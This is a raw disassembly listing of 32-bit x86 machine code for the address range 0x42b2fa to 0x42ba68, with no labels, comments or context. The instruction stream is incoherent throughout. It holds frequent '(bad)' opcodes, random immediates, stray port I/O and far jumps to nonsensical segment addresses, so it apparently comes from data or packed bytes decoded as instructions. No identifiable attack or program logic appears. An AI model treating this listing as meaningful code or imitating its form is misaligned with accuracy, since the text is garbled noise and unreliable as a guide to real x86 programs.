  42b2fa:	scas   eax,DWORD PTR es:[edi]
  42b2fb:	inc    eax
  42b2fc:	pop    ss
  42b2fd:	popf   
  42b2fe:	inc    eax
  42b2ff:	mov    edi,0x956c6e96
  42b304:	inc    edi
  42b305:	cmp    al,0xe4
  42b307:	inc    edi
  42b308:	xchg   BYTE PTR [eax+0x46],ah
  42b30b:	(bad)  
  42b30c:	repnz fild DWORD PTR [esi+0x1]
  42b310:	push   0x50
  42b312:	outs   dx,BYTE PTR ds:[esi]
  42b313:	ins    BYTE PTR es:[edi],dx
  42b314:	ss cwde 
  42b316:	in     al,dx
  42b317:	rol    BYTE PTR [edx],1
  42b319:	mov    ah,0x6e
  42b31b:	aam    0xe4
  42b31d:	add    al,0xb2
  42b31f:	push   0xffffffca
  42b321:	icebp  
  42b322:	mov    al,ds:0x88d24760
  42b327:	shl    DWORD PTR [ebx],0xc4
  42b32a:	mov    fs,edx
  42b32c:	mov    dh,0xff
  42b32e:	add    ecx,ebp
  42b330:	jno    0x42b368
  42b332:	ficom  DWORD PTR [eax-0x24ad1620]
  42b338:	inc    eax
  42b339:	pop    esp
  42b33a:	mov    ?,WORD PTR [ebx+0x38]
  42b33d:	inc    edi
  42b33e:	popa   
  42b33f:	adc    ebx,edi
  42b341:	lea    esp,[esi+0x14cb65a0]
  42b347:	mov    al,0x50
  42b349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b34a:	fdiv   DWORD PTR [esi+0x1c12858d]
  42b350:	mov    ebp,DWORD PTR [edx]
  42b352:	into   
  42b353:	pop    esp
  42b354:	inc    esi
  42b355:	inc    ecx
  42b356:	or     al,0x6c
  42b358:	mov    BYTE PTR [edx-0x5f],ch
  42b35b:	pop    ebp
  42b35c:	jnp    0x42b3d4
  42b35e:	ret    
  42b35f:	(bad)  
  42b360:	pop    eax
  42b361:	fsubr  DWORD PTR [edx]
  42b363:	sub    eax,0x166b1f1f
  42b368:	daa    
  42b369:	pop    eax
  42b36a:	sub    eax,0xdd05dabe
  42b36f:	ret    
  42b370:	xlat   BYTE PTR ds:[ebx]
  42b371:	pop    edx
  42b372:	repnz push ecx
  42b374:	pop    ss
  42b375:	jge    0x42b34a
  42b377:	mov    ds:0x32dd4476,al
  42b37c:	bound  esp,QWORD PTR [esi]
  42b37e:	xchg   edx,eax
  42b37f:	ins    BYTE PTR es:[edi],dx
  42b380:	pop    DWORD PTR [esi]
  42b382:	aam    0x1
  42b384:	in     al,dx
  42b385:	lahf   
  42b386:	push   ecx
  42b387:	and    ebp,ecx
  42b389:	or     al,0x43
  42b38b:	sbb    BYTE PTR [ebx],0x9b
  42b38e:	mov    eax,ds:0xa87280ec
  42b393:	mov    al,ds:0xb616ddb1
  42b398:	xchg   BYTE PTR [edi-0x29a2df66],dh
  42b39e:	xchg   DWORD PTR [ebp-0x48],esp
  42b3a1:	pop    ecx
  42b3a2:	mov    DWORD PTR [esi-0x403aff40],edx
  42b3a8:	adc    BYTE PTR [edi-0x23],dl
  42b3ab:	push   0x144e46c1
  42b3b0:	pop    ds
  42b3b1:	push   ds
  42b3b2:	fs push cs
  42b3b4:	je     0x42b419
  42b3b6:	arpl   WORD PTR [ecx-0x75a352f5],bp
  42b3bc:	mov    ah,0x3f
  42b3be:	add    eax,esi
  42b3c0:	sbb    ebp,DWORD PTR [edx]
  42b3c2:	fadd   DWORD PTR ds:0x4a55fc26
  42b3c8:	or     al,0xe3
  42b3ca:	fidiv  DWORD PTR [esi-0x170197a3]
  42b3d0:	dec    edi
  42b3d1:	or     bl,BYTE PTR [ecx-0x1]
  42b3d4:	inc    esp
  42b3d5:	lds    ecx,FWORD PTR [ebx]
  42b3d7:	or     ch,BYTE PTR [eax+0x29]
  42b3da:	ficom  DWORD PTR [edx+0x52b6777e]
  42b3e0:	fild   DWORD PTR [ebp+ebp*8+0x49]
  42b3e4:	pop    edx
  42b3e5:	std    
  42b3e6:	aaa    
  42b3e7:	lds    ebx,FWORD PTR [esi]
  42b3e9:	sbb    eax,0x6c6db632
  42b3ee:	in     eax,dx
  42b3ef:	mov    dh,0x58
  42b3f1:	gs pop edi
  42b3f3:	sub    al,0xdb
  42b3f5:	sti    
  42b3f6:	add    eax,0x36d81dde
  42b3fb:	mov    edx,0x3018e2
  42b400:	stos   DWORD PTR es:[edi],eax
  42b401:	sbb    edx,DWORD PTR [ebx-0x38]
  42b404:	sbb    bl,dl
  42b406:	inc    esp
  42b407:	pop    esp
  42b408:	fdivr  DWORD PTR [edx+0x6ca1829b]
  42b40e:	out    dx,eax
  42b40f:	lds    ebp,FWORD PTR [edx+0x43]
  42b412:	je     0x42b3ef
  42b414:	ds xchg ecx,eax
  42b416:	ins    DWORD PTR es:[edi],dx
  42b417:	sub    al,0xab
  42b419:	shr    DWORD PTR [esp+ebp*2+0x440b4af7],1
  42b420:	pop    ebx
  42b421:	xchg   esp,eax
  42b422:	ja     0x42b3f5
  42b424:	js     0x42b400
  42b426:	dec    ebp
  42b427:	mov    bh,0x16
  42b429:	fcom   DWORD PTR [esi-0x64eb7741]
  42b42f:	mov    cl,0x6e
  42b431:	dec    ecx
  42b432:	(bad)  
  42b434:	inc    edx
  42b435:	inc    ebx
  42b436:	pop    ebp
  42b437:	push   0xec60765c
  42b43c:	push   ss
  42b43d:	iret   
  42b43e:	(bad)  
  42b43f:	imul   edx,DWORD PTR [edi+0x1f63d75a],0xffffffdc
  42b446:	sbb    eax,0xf552892f
  42b44b:	or     ebp,DWORD PTR [edi+0x54744576]
  42b451:	sahf   
  42b452:	stc    
  42b453:	dec    eax
  42b454:	test   al,0x4d
  42b456:	adc    al,dl
  42b458:	push   eax
  42b459:	shl    DWORD PTR [esi+ecx*4+0x50],0xe0
  42b45e:	fiadd  DWORD PTR [eax+esi*2-0x5f]
  42b462:	(bad)  
  42b464:	add    dh,cl
  42b466:	pop    edx
  42b467:	sbb    dh,0xdc
  42b46a:	or     bh,BYTE PTR [ebx-0x739cf500]
  42b470:	add    al,0x2f
  42b472:	add    DWORD PTR [edx+ecx*4-0x47eea2e5],ecx
  42b479:	out    dx,eax
  42b47a:	vmread DWORD PTR [ecx],esi
  42b47d:	rol    BYTE PTR [eax+eax*1-0x45],1
  42b481:	xor    edx,DWORD PTR [ebp-0x67]
  42b484:	lea    ebx,[edi-0x47754525]
  42b48a:	pop    eax
  42b48b:	loop   0x42b487
  42b48d:	fs hlt 
  42b48f:	adc    DWORD PTR [ecx-0x5a49489b],ebx
  42b495:	jbe    0x42b50d
  42b497:	inc    esi
  42b498:	stos   BYTE PTR es:[edi],al
  42b499:	mov    eax,ds:0x61b8e992
  42b49e:	ss (bad) 
  42b4a0:	lods   eax,DWORD PTR ds:[esi]
  42b4a1:	or     edx,ebx
  42b4a3:	add    al,0xad
  42b4a5:	hlt    
  42b4a6:	test   eax,0x7f8b7ba
  42b4ab:	adc    eax,0xa619addb
  42b4b0:	(bad)  
  42b4b1:	jle    0x42b49f
  42b4b3:	mov    eax,ds:0x83a36d54
  42b4b8:	push   0xfffffff0
  42b4ba:	sbb    BYTE PTR [ecx+0x16],ah
  42b4bd:	or     eax,edi
  42b4bf:	mov    al,0x25
  42b4c1:	loop   0x42b498
  42b4c3:	test   DWORD PTR [eax-0x22cd454b],ecx
  42b4c9:	adc    DWORD PTR [esp+eax*8-0x53],0xffffffc1
  42b4ce:	retf   
  42b4cf:	pop    ebp
  42b4d0:	sar    DWORD PTR [esi],1
  42b4d2:	das    
  42b4d3:	in     eax,0x89
  42b4d5:	call   0xd7878990
  42b4da:	mov    bl,0xbc
  42b4dc:	dec    ebp
  42b4dd:	jne    0x42b4e5
  42b4df:	adc    dh,0x4
  42b4e2:	jo     0x42b485
  42b4e4:	fistp  DWORD PTR [ecx]
  42b4e6:	stos   BYTE PTR es:[edi],al
  42b4e7:	cs rcr edx,1
  42b4ea:	push   cs
  42b4eb:	lods   eax,DWORD PTR ds:[esi]
  42b4ec:	add    DWORD PTR [edx+0x1a5695db],ebp
  42b4f2:	sti    
  42b4f3:	sbb    DWORD PTR [ebp+0x1d0b6ee6],0xffffffc0
  42b4fa:	xchg   edx,eax
  42b4fb:	(bad)  
  42b4fd:	mov    ds:0x5b607fd,al
  42b502:	sbb    BYTE PTR [ebx+ebx*1+0x3b],ch
  42b506:	and    dl,BYTE PTR [ecx-0x4b9c63cc]
  42b50c:	out    0xa3,al
  42b50e:	mov    fs,WORD PTR [edx-0x56ffeeca]
  42b514:	push   eax
  42b515:	loopne 0x42b532
  42b517:	pop    ss
  42b518:	dec    edx
  42b519:	fcmovnbe st,st(6)
  42b51b:	fs into 
  42b51d:	xchg   BYTE PTR [esi+0x36076a16],al
  42b523:	cmp    DWORD PTR [ebp+0x6c],ebp
  42b526:	pop    esp
  42b527:	push   0x511d9474
  42b52c:	adc    cl,BYTE PTR [ebx+0x86be439]
  42b532:	sbb    BYTE PTR [edi],0x1c
  42b535:	loop   0x42b564
  42b537:	daa    
  42b538:	test   edx,0x7150d68d
  42b53e:	addr16 (bad) 
  42b540:	nop
  42b541:	icebp  
  42b542:	push   0xf95b4167
  42b547:	inc    edx
  42b548:	mov    WORD PTR [ebp-0x49462700],ds
  42b54e:	imul   esp,DWORD PTR [eax-0x55],0x70
  42b552:	mov    ds:0x6f85b41c,eax
  42b557:	add    DWORD PTR [esp+edx*1],esi
  42b55a:	rol    DWORD PTR [esi+0x6d],0x8d
  42b55e:	retf   0x1002
  42b561:	sbb    BYTE PTR [eax+0x575b6c01],ch
  42b567:	ror    cl,1
  42b569:	xor    BYTE PTR [ebx],0x92
  42b56c:	enter  0xb637,0x6d
  42b570:	test   eax,0x92870be3
  42b575:	dec    esi
  42b576:	enter  0x7510,0xc2
  42b57a:	lea    eax,[ebp-0x44f52493]
  42b580:	mov    edi,0x6e18145d
  42b585:	pop    eax
  42b586:	inc    ebx
  42b587:	dec    ebp
  42b588:	adc    BYTE PTR [ebx-0x49],bl
  42b58b:	stc    
  42b58c:	xchg   dh,cl
  42b58e:	(bad)  [edi+0x28]
  42b591:	int    0x4d
  42b593:	fld    TBYTE PTR [esi-0x73]
  42b596:	or     ebp,ebx
  42b598:	cdq    
  42b599:	xor    ebp,DWORD PTR [edx]
  42b59b:	lods   eax,DWORD PTR ds:[esi]
  42b59c:	dec    edi
  42b59d:	call   0x828445b0
  42b5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b5a3:	sbb    ebx,DWORD PTR [ebx+0x2c]
  42b5a6:	pop    ss
  42b5a7:	lahf   
  42b5a8:	outs   dx,BYTE PTR ds:[esi]
  42b5a9:	loope  0x42b534
  42b5ab:	and    bl,bl
  42b5ad:	repnz mov dh,0x9
  42b5b0:	add    esi,DWORD PTR [ebp+0xd]
  42b5b3:	inc    ecx
  42b5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b5b5:	add    BYTE PTR [ebx-0x49],dl
  42b5b8:	xchg   BYTE PTR [eax+0x6d],ch
  42b5bb:	adc    BYTE PTR [eax+0x5bb1bcaa],bl
  42b5c1:	pop    esp
  42b5c2:	xchg   ebp,eax
  42b5c3:	sub    edi,eax
  42b5c5:	mov    dh,0x4a
  42b5c7:	gs add eax,0xb6d2789a
  42b5cd:	xchg   esi,eax
  42b5ce:	fsubr  DWORD PTR [eax+0x1c]
  42b5d1:	js     0x42b64c
  42b5d3:	popa   
  42b5d4:	es cli 
  42b5d6:	inc    BYTE PTR [ebx]
  42b5d8:	pusha  
  42b5d9:	push   edi
  42b5da:	(bad)  [edx+edx*8]
  42b5dd:	mov    ch,bl
  42b5df:	repnz test BYTE PTR [edi-0x4fe8dfdb],0x34
  42b5e7:	jl     0x42b5e8
  42b5e9:	push   ecx
  42b5ea:	or     edi,DWORD PTR [eax+0x5a87556d]
  42b5f0:	ror    esi,1
  42b5f2:	or     dl,BYTE PTR [ebx-0x54969280]
  42b5f8:	cmp    dl,0x54
  42b5fb:	xchg   edx,eax
  42b5fc:	ret    
  42b5fd:	xchg   BYTE PTR [edx+0x20],dh
  42b600:	outs   dx,BYTE PTR ds:[esi]
  42b601:	or     eax,DWORD PTR [ebp-0x73fba422]
  42b607:	dec    esi
  42b608:	call   0x86f960a2
  42b60d:	stos   DWORD PTR es:[edi],eax
  42b60e:	loop   0x42b66f
  42b610:	fstp   TBYTE PTR [ecx-0x49069753]
  42b616:	push   cs
  42b617:	jnp    0x42b5c9
  42b619:	out    0x20,al
  42b61b:	add    BYTE PTR [edi],al
  42b61d:	enter  0xc291,0xad
  42b621:	mov    ds:0x48009f88,eax
  42b626:	outs   dx,BYTE PTR ds:[esi]
  42b627:	inc    ebp
  42b628:	jb     0x42b682
  42b62a:	stos   BYTE PTR es:[edi],al
  42b62b:	sbb    eax,0x8ceedb14
  42b630:	xchg   edi,eax
  42b631:	ins    BYTE PTR es:[edi],dx
  42b632:	push   eax
  42b633:	cmp    DWORD PTR [ebp+0x6a],edx
  42b636:	fld    TBYTE PTR [esi]
  42b638:	inc    esp
  42b639:	jbe    0x42b659
  42b63b:	sbb    bl,BYTE PTR [eax+edi*1]
  42b63e:	adc    DWORD PTR [ecx+0x2b],esp
  42b641:	inc    eax
  42b642:	mov    eax,ds:0x3e13253c
  42b647:	(bad)  
  42b648:	in     eax,0x2a
  42b64a:	push   0x13
  42b64c:	jo     0x42b60a
  42b64e:	adc    BYTE PTR [edi],dh
  42b650:	js     0x42b5e1
  42b652:	fisubr DWORD PTR [esi+0x25]
  42b655:	jmp    0x9202:0x29ffbc9
  42b65c:	pop    edi
  42b65d:	mov    dl,0x5
  42b65f:	mov    al,ds:0x7b7f0e8d
  42b664:	iret   
  42b665:	dec    ecx
  42b666:	adc    al,0x6d
  42b668:	popa   
  42b669:	add    DWORD PTR [ebp-0x676af266],0xffffffbf
  42b670:	push   edx
  42b671:	test   eax,0xb8d88e0
  42b676:	pop    ebx
  42b677:	add    edx,ecx
  42b679:	rcr    bh,1
  42b67b:	lods   eax,DWORD PTR ds:[esi]
  42b67c:	jne    0x42b6c3
  42b67e:	push   ebp
  42b67f:	push   ebx
  42b680:	shl    DWORD PTR [esi-0x194a1c04],0x69
  42b687:	imul   eax,DWORD PTR [ebx],0xbeb6c160
  42b68d:	xor    DWORD PTR [ecx+0x5b1586e3],eax
  42b693:	or     eax,ebp
  42b695:	jno    0x42b67b
  42b697:	enter  0xd510,0x36
  42b69b:	adc    al,0x1b
  42b69d:	adc    al,0xbf
  42b69f:	inc    edx
  42b6a0:	mov    al,ds:0xba80543
  42b6a5:	sar    BYTE PTR [ebx-0x4ff1c04e],1
  42b6ab:	fwait
  42b6ac:	mov    esp,ebx
  42b6ae:	and    DWORD PTR [eax-0x25657e25],eax
  42b6b4:	jno    0x42b636
  42b6b6:	and    edx,esi
  42b6b8:	add    eax,0xe0e3a975
  42b6bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6be:	addr16 sub edi,edi
  42b6c1:	(bad)
  42b6c4:	mov    ah,0xc1
  42b6c6:	sar    BYTE PTR [edx+0x11],cl
  42b6c9:	push   eax
  42b6ca:	mov    ebp,0xcc5c4eb3
  42b6cf:	xor    eax,0xd8a0bb51
  42b6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6d6:	sbb    al,0x40
  42b6d8:	cld    
  42b6d9:	es mov edx,0xed502ed0
  42b6df:	jle    0x42b6f5
  42b6e1:	mov    eax,0x44546f4
  42b6e6:	sub    al,0x6f
  42b6e8:	fld    TBYTE PTR [edx+0x63]
  42b6eb:	into   
  42b6ec:	pushf  
  42b6ed:	push   0xcfa900cb
  42b6f2:	pop    ebx
  42b6f3:	push   edi
  42b6f4:	jno    0x42b69f
  42b6f6:	fs xchg ebp,eax
  42b6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6f9:	stc    
  42b6fa:	jmp    FWORD PTR [eax-0x3b]
  42b6fd:	mov    eax,ds:0xb6800eb7
  42b702:	or     esi,DWORD PTR [eax-0x4dd23cc]
  42b708:	not    DWORD PTR [ebp+0x788dab9b]
  42b70e:	adc    al,0xcb
  42b710:	push   esi
  42b711:	sub    ebp,eax
  42b713:	loopne 0x42b6f2
  42b715:	push   0x0
  42b717:	adc    BYTE PTR [edx+0x44222df1],0xd6
  42b71e:	sub    BYTE PTR [esi],dh
  42b720:	adc    al,0xb5
  42b722:	push   0x5b912deb
  42b727:	mov    al,ds:0xa786c283
  42b72c:	js     0x42b736
  42b72e:	and    ah,BYTE PTR [ebp+eax*1+0x595ba2ab]
  42b735:	sub    al,BYTE PTR [ebx+edx*2]
  42b738:	ds (bad) 
  42b73a:	adc    bl,bl
  42b73c:	jbe    0x42b79f
  42b73e:	mov    ds:0xd6796fb5,eax
  42b743:	(bad)  
  42b744:	inc    edx
  42b745:	je     0x42b6cb
  42b747:	cmp    DWORD PTR [edi+0x6d],0xffffffdb
  42b74b:	fisubr DWORD PTR [edx+0x32]
  42b74e:	les    eax,FWORD PTR [edx+ebp*2-0x739aee4a]
  42b755:	mov    ah,0xd1
  42b757:	adc    eax,0x89a6a3c0
  42b75c:	nop
  42b75d:	data16 ja 0x42b73a
  42b760:	push   es
  42b761:	shl    BYTE PTR [esi-0x5043a2f],0xf9
  42b768:	int3   
  42b769:	pop    ecx
  42b76a:	jb     0x42b77c
  42b76c:	fcom   QWORD PTR [esi]
  42b76e:	pop    es
  42b76f:	fbstp  TBYTE PTR [esi-0x72c2f990]
  42b775:	pop    ebp
  42b776:	rol    DWORD PTR [ebp-0x7abb24c0],1
  42b77c:	inc    esp
  42b77d:	out    0x1e,al
  42b77f:	(bad)  [esi-0x57c193d3]
  42b785:	xor    DWORD PTR [ebx+0x708f83bf],esi
  42b78b:	push   cs
  42b78c:	sub    eax,0x82abadb6
  42b791:	push   cs
  42b792:	or     esp,DWORD PTR [esi+0x9e99ba7]
  42b798:	add    al,0x70
  42b79a:	(bad)  
  42b79c:	pop    esp
  42b79d:	pop    ebp
  42b79e:	xor    eax,DWORD PTR [edx-0x3f35624c]
  42b7a4:	rcl    dh,cl
  42b7a6:	mov    al,0x54
  42b7a8:	or     BYTE PTR [ebp-0x41],ch
  42b7ab:	xchg   esi,eax
  42b7ac:	lock sub DWORD PTR [eax+0x5b],esp
  42b7b0:	and    BYTE PTR [edi-0x13],ah
  42b7b3:	mov    DWORD PTR gs:[eax+esi*2+0x6b],edi
  42b7b8:	mov    bh,0xb6
  42b7ba:	into   
  42b7bb:	cmp    eax,DWORD PTR [edi-0x32]
  42b7be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b7bf:	mov    bh,0x3b
  42b7c1:	inc    ecx
  42b7c2:	dec    ecx
  42b7c3:	pop    edi
  42b7c4:	outs   dx,BYTE PTR ds:[esi]
  42b7c5:	je     0x42b807
  42b7c7:	mov    cl,0xfa
  42b7c9:	add    BYTE PTR [ebx+0x49f9ff69],0x6b
  42b7d0:	mov    bh,0x26
  42b7d2:	or     BYTE PTR [edi+0x1d],ch
  42b7d5:	dec    ebp
  42b7d6:	dec    ebx
  42b7d7:	lds    esp,FWORD PTR [edx+0x5f]
  42b7da:	ins    DWORD PTR es:[edi],dx
  42b7db:	sub    al,0x3c
  42b7dd:	jno    0x42b7de
  42b7df:	xchg   ebp,eax
  42b7e0:	xchg   edi,eax
  42b7e1:	or     ebx,edi
  42b7e3:	fdiv   QWORD PTR [ebp-0x34]
  42b7e6:	cmp    ah,BYTE PTR [edx-0x25]
  42b7e9:	outs   dx,BYTE PTR ds:[esi]
  42b7ea:	fdiv   st(0),st
  42b7ec:	or     esp,ebp
  42b7ee:	xchg   ecx,eax
  42b7ef:	mov    eax,ebx
  42b7f1:	mov    bl,0x3c
  42b7f3:	fld    TBYTE PTR [eax]
  42b7f5:	aaa    
  42b7f6:	fdivr  DWORD PTR [eax+edx*1+0x12f6ae11]
  42b7fd:	int    0x83
  42b7ff:	pop    ebx
  42b800:	fld    TBYTE PTR [edx+0x6a]
  42b803:	mov    BYTE PTR [ebx-0x7e],bh
  42b806:	sub    dl,bl
  42b808:	mov    dh,0xa1
  42b80a:	inc    ebx
  42b80b:	jbe    0x42b878
  42b80d:	add    al,BYTE PTR [eax-0xa78a9fe]
  42b813:	out    0xb0,al
  42b815:	sbb    eax,0xa5d005da
  42b81a:	inc    edi
  42b81b:	loop   0x42b7e7
  42b81d:	imul   ebx,edx,0xffffffaa
  42b820:	sbb    eax,0xf39f6c45
  42b825:	clc    
  42b826:	fcmovnu st,st(2)
  42b828:	loope  0x42b875
  42b82a:	cmc    
  42b82b:	or     bl,dl
  42b82d:	lods   eax,DWORD PTR ds:[esi]
  42b82e:	add    BYTE PTR [edi-0x1c889859],ch
  42b834:	cmp    cl,BYTE PTR ss:[eax]
  42b837:	ss in  al,0x4e
  42b83a:	cmp    ch,0xae
  42b83d:	adc    al,0x42
  42b83f:	jecxz  0x42b817
  42b841:	stos   BYTE PTR es:[edi],al
  42b842:	push   0x456ed95f
  42b847:	push   ebp
  42b848:	fstp   TBYTE PTR [edx]
  42b84a:	mov    ds:0x655a81ed,al
  42b84f:	cmc    
  42b850:	leave  
  42b851:	out    0x47,al
  42b853:	jl     0x42b7fc
  42b855:	ss adc eax,0xc9206374
  42b85b:	xor    al,0x21
  42b85d:	ret    
  42b85e:	xor    DWORD PTR [ebp*2-0x237dd925],ecx
  42b865:	and    al,0x99
  42b867:	xlat   BYTE PTR ds:[ebx]
  42b868:	pop    esi
  42b869:	je     0x42b892
  42b86b:	imul   eax,DWORD PTR [ecx+0x17],0xffffffb5
  42b86f:	jp     0x42b806
  42b871:	push   ds
  42b872:	xchg   DWORD PTR [esi-0x53],esi
  42b875:	rol    DWORD PTR [eax],1
  42b877:	mov    al,0x70
  42b879:	adc    al,0xff
  42b87b:	jg     0x42b88e
  42b87d:	xchg   ecx,eax
  42b87e:	push   edi
  42b87f:	mov    dh,0xdb
  42b881:	mov    dh,0xb4
  42b883:	(bad)  
  42b884:	cmp    esp,ebp
  42b886:	popf   
  42b887:	adc    al,0x1f
  42b889:	ja     0x42b885
  42b88b:	(bad)  
  42b88c:	cmp    al,cl
  42b88e:	sub    edi,DWORD PTR [edx+0x3220d6c5]
  42b894:	fcom   QWORD PTR [ebx-0x7a3b7886]
  42b89a:	lods   eax,DWORD PTR ds:[esi]
  42b89b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b89c:	lods   eax,DWORD PTR ds:[esi]
  42b89d:	(bad)  
  42b89e:	cmp    BYTE PTR [ebp+0x1143e768],bl
  42b8a4:	mov    esi,0xb616db76
  42b8a9:	js     0x42b8d7
  42b8ab:	leave  
  42b8ac:	retf   0x6b9e
  42b8af:	mov    bh,0xda
  42b8b1:	and    eax,ebp
  42b8b3:	sti    
  42b8b4:	mov    ah,0xd5
  42b8b6:	inc    ecx
  42b8b7:	shl    BYTE PTR [ecx],1
  42b8b9:	sahf   
  42b8ba:	pusha  
  42b8bb:	or     bh,bl
  42b8bd:	and    DWORD PTR [eax+0x15b9bfe5],ebp
  42b8c3:	scas   al,BYTE PTR es:[edi]
  42b8c4:	add    cl,dl
  42b8c6:	push   ss
  42b8c7:	add    BYTE PTR [esi],bh
  42b8c9:	and    BYTE PTR [ecx+0x7551da5c],0xa3
  42b8d0:	jmp    0x2c3f:0x57a88275
  42b8d7:	call   0x2f43:0x1fd5ba2a
  42b8de:	mov    al,ds:0xdbce02
  42b8e3:	mov    al,0xdd
  42b8e5:	loopne 0x42b947
  42b8e7:	dec    edx
  42b8e8:	(bad)  
  42b8ea:	or     bh,BYTE PTR [eax+ebp*1-0x56]
  42b8ee:	(bad)  [esi]
  42b8f0:	mov    BYTE PTR [ebx-0x47],bl
  42b8f3:	gs xor al,0x25
  42b8f6:	outs   dx,DWORD PTR ds:[esi]
  42b8f7:	arpl   WORD PTR ds:0x752e80,bx
  42b8fd:	ins    DWORD PTR es:[edi],dx
  42b8fe:	mov    esp,0x1aadf7c5
  42b903:	enter  0xd8f1,0xb6
  42b907:	xchg   BYTE PTR [eax],ah
  42b909:	inc    DWORD PTR [esi]
  42b90b:	adc    al,0x13
  42b90d:	stos   BYTE PTR es:[edi],al
  42b90e:	mov    ?,WORD PTR [ebp+0x50]
  42b911:	mov    ah,0xdd
  42b913:	jnp    0x42b92b
  42b915:	sbb    DWORD PTR [edi-0x48f5114b],esp
  42b91b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b91c:	mov    edx,0x3c3095b1
  42b921:	mov    ds:0x8fb3e6f4,al
  42b926:	gs adc al,0x8a
  42b929:	push   0x53
  42b92b:	inc    ecx
  42b92c:	arpl   sp,bx
  42b92e:	pop    ebp
  42b92f:	fist   DWORD PTR [ebp-0x4f]
  42b932:	in     eax,dx
  42b933:	pop    ds
  42b934:	je     0x42b909
  42b936:	(bad)  
  42b937:	push   0xfffffffc
  42b939:	sbb    al,0xc6
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	push   es
  42b93d:	mov    ch,ah
  42b93f:	inc    esi
  42b940:	int3   
  42b941:	fcomp  QWORD PTR ss:[ecx-0x1c]
  42b945:	and    al,bl
  42b947:	push   ecx
  42b948:	fstp   TBYTE PTR [edx+0x6cbc17e4]
  42b94e:	lahf   
  42b94f:	ds mov bh,0xd8
  42b952:	ss mov edx,0xb4b70271
  42b958:	and    edx,DWORD PTR [ebx]
  42b95a:	lock js 0x42b9c8
  42b95d:	add    DWORD PTR [ebp+esi*2+0x702ece2b],esi
  42b964:	fisubr DWORD PTR cs:[esp+esi*4+0x6d]
  42b969:	(bad)  [esi+0x54]
  42b96c:	ins    BYTE PTR es:[edi],dx
  42b96d:	jge    0x42b9ed
  42b96f:	inc    edi
  42b970:	jge    0x42b90a
  42b972:	pusha  
  42b973:	iret   
  42b974:	bound  ebp,QWORD PTR [ecx]
  42b976:	push   0x51
  42b978:	mov    dl,0xbc
  42b97a:	pop    edx
  42b97b:	test   DWORD PTR [ebp-0x25],ebp
  42b97e:	call   0x8da1:0x7bfe1b07
  42b985:	cmp    cl,bh
  42b987:	jmp    0x42b96a
  42b989:	inc    esi
  42b98a:	pop    ebx
  42b98b:	mov    ds:0x6e0c9fcb,al
  42b990:	dec    eax
  42b991:	nop
  42b992:	add    ebx,edx
  42b994:	pop    edx
  42b995:	add    ebx,ebx
  42b997:	inc    esi
  42b998:	ss stos BYTE PTR es:[edi],al
  42b99a:	das    
  42b99b:	mov    dl,0x6f
  42b99d:	push   ebp
  42b99e:	xor    eax,0xab6d1cd
  42b9a3:	out    dx,al
  42b9a4:	cli    
  42b9a5:	push   ebx
  42b9a6:	out    0x23,eax
  42b9a8:	sub    BYTE PTR [eax],al
  42b9aa:	pop    ebp
  42b9ab:	aam    0x11
  42b9ad:	out    dx,al
  42b9ae:	imul   edi,DWORD PTR [ecx-0x22],0xb9b5b06f
  42b9b5:	cmp    DWORD PTR [eax],edi
  42b9b7:	aas    
  42b9b8:	test   eax,0x79104786
  42b9bd:	add    ch,al
  42b9bf:	push   cs
  42b9c0:	mov    cl,bh
  42b9c2:	aad    0xf
  42b9c4:	sub    DWORD PTR [edi+0xf],edi
  42b9c7:	pop    esi
  42b9c8:	rol    edx,cl
  42b9ca:	push   edx
  42b9cb:	fild   DWORD PTR [esi+ebp*2-0x10]
  42b9cf:	adc    eax,0xeeb7a1ce
  42b9d4:	in     eax,dx
  42b9d5:	mov    ds:0x6e3aed1b,al
  42b9da:	push   ebx
  42b9db:	or     al,0x4e
  42b9dd:	mov    bl,0x71
  42b9df:	mov    dh,0xa3
  42b9e1:	sub    ebp,DWORD PTR [edx+0x729a100d]
  42b9e7:	loop   0x42b98c
  42b9e9:	pop    edi
  42b9ea:	mov    al,ds:0xe2afa170
  42b9ef:	dec    ecx
  42b9f0:	aam    0xfd
  42b9f2:	push   es
  42b9f3:	fisttp DWORD PTR [ecx-0x26925500]
  42b9f9:	mov    esi,0xcdf5bb96
  42b9fe:	adc    esi,edi
  42ba00:	rdtsc  
  42ba02:	xlat   BYTE PTR ds:[ebx]
  42ba03:	loop   0x42ba47
  42ba05:	pop    es
  42ba06:	ror    DWORD PTR [esi],0x10
  42ba09:	jbe    0x42ba09
  42ba0b:	pop    ds
  42ba0c:	int3   
  42ba0d:	mov    bl,0xb6
  42ba0f:	cmp    eax,0xd7052a6d
  42ba14:	inc    eax
  42ba15:	or     BYTE PTR [eiz*2+0x42dbc247],cl
  42ba1c:	jecxz  0x42b9f0
  42ba1e:	xor    BYTE PTR [ecx-0x352721c2],bh
  42ba24:	push   eax
  42ba25:	inc    edi
  42ba26:	jo     0x42ba28
  42ba28:	mov    dh,0xad
  42ba2a:	add    DWORD PTR [ebp-0x1d],esi
  42ba2d:	loope  0x42ba34
  42ba2f:	in     al,0xdb
  42ba31:	call   0x265:0xa45136aa
  42ba38:	xor    dl,BYTE PTR [ebp+ebx*1+0x6d8016d8]
  42ba3f:	inc    edx
  42ba40:	jno    0x42ba1a
  42ba42:	arpl   WORD PTR [edi-0x59],bx
  42ba45:	fcmovu st,st(2)
  42ba47:	add    ch,BYTE PTR [edx+0x2]
  42ba4a:	shl    DWORD PTR [esp+ebp*1-0x7d149eb4],1
  42ba51:	fdivr  DWORD PTR [eax+eiz*2+0x72]
  42ba55:	jmp    0x42ba59
  42ba57:	dec    ebx
  42ba58:	jg     0x42ba5e
  42ba5a:	fld    TBYTE PTR [ebp+0x69]
  42ba5d:	in     eax,dx
  42ba5e:	inc    ecx
  42ba5f:	jno    0x42ba17
  42ba61:	mov    eax,0x2dfc242
  42ba66:	dec    ebx
  42ba67:	lods   eax,DWORD PTR ds:[esi]
  42ba68:	sbb    eax,0x49518631
